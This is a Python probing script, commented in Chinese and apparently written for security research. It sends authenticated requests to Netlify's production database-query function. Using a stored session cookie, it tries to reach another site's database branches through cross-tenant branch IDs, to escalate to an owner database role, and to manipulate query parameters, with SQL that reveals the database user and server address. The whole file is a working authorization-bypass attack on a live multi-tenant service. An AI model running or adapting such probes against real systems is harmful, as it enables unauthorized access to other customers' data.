# -*- coding: utf-8 -*-
"""database-query branchId 参数探测(JS bundle 泄露 UI 传 branchId)
测试:branchId 归属校验 / 交叉访问 / role 变体 / params 参数
A cookie 会话(UI 通道,与 database-query 匹配)
"""
import http.client, ssl, gzip, brotli, json, sys, itertools
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
BRANCH_B1 = 'agent-6a98d5e6448c07a76d7babf3'   # B 的 agent 分支(独立 endpoint)
BRANCH_B2 = 'agent-6a98d6d818790895d7d5ac00'   # B 的第二个 agent 分支
ctx = ssl.create_default_context()
_seq = itertools.count(1)


def dbq(body, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:600].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'EXC %r' % e
    finally:
        conn.close()
    return st, out


def t(label, body, trunc=300):
    st, out = dbq(body)
    print('%-42s [%d] %s' % (label, st, out.replace('\n', ' | ')[:trunc]))


print('== baseline(无 branchId)==')
t('no_branchId', {'siteId': SITE_A, 'action': 'query', 'sql': 'select current_user::text, inet_server_addr()::text'})
t('branchId=production', {'siteId': SITE_A, 'branchId': 'production', 'action': 'query',
                          'sql': 'select current_user::text, inet_server_addr()::text'})
print()
print('== branchId 归属校验 ==')
t('branchId=no-such-branch', {'siteId': SITE_A, 'branchId': 'no-such-branch-xyz', 'action': 'query',
                              'sql': 'select 1'})
t('A_site+B_branch1(交叉)', {'siteId': SITE_A, 'branchId': BRANCH_B1, 'action': 'query',
                            'sql': 'select current_user::text, inet_server_addr()::text'})
t('A_site+B_branch2(交叉)', {'siteId': SITE_A, 'branchId': BRANCH_B2, 'action': 'query',
                            'sql': 'select current_user::text, inet_server_addr()::text'})
print()
print('== siteId 交叉(branchId 固定 B 分支)==')
t('B_site+B_branch1(自属)', {'siteId': SITE_B, 'branchId': BRANCH_B1, 'action': 'query',
                            'sql': 'select current_user::text, inet_server_addr()::text'})
print()
print('== role 变体(cookie 通道)==')
t('role=readonly', {'siteId': SITE_A, 'branchId': 'production', 'role': 'readonly', 'action': 'query',
                    'sql': 'select current_user::text'})
t('role=owner', {'siteId': SITE_A, 'branchId': 'production', 'role': 'netlifydb_owner', 'action': 'query',
                 'sql': 'select current_user::text'})
t('role=garbage', {'siteId': SITE_A, 'branchId': 'production', 'role': 'garbage-role-xyz', 'action': 'query',
                   'sql': 'select current_user::text'})
print()
print('== params 参数 ==')
t('params=[]', {'siteId': SITE_A, 'branchId': 'production', 'action': 'query',
                'sql': 'select $1::int as a', 'params': []})
t('params=[42]', {'siteId': SITE_A, 'branchId': 'production', 'action': 'query',
                  'sql': 'select $1::int as a', 'params': [42]})
t('params=[[1]]', {'siteId': SITE_A, 'branchId': 'production', 'action': 'query',
                   'sql': 'select $1::int as a', 'params': [[1]]})
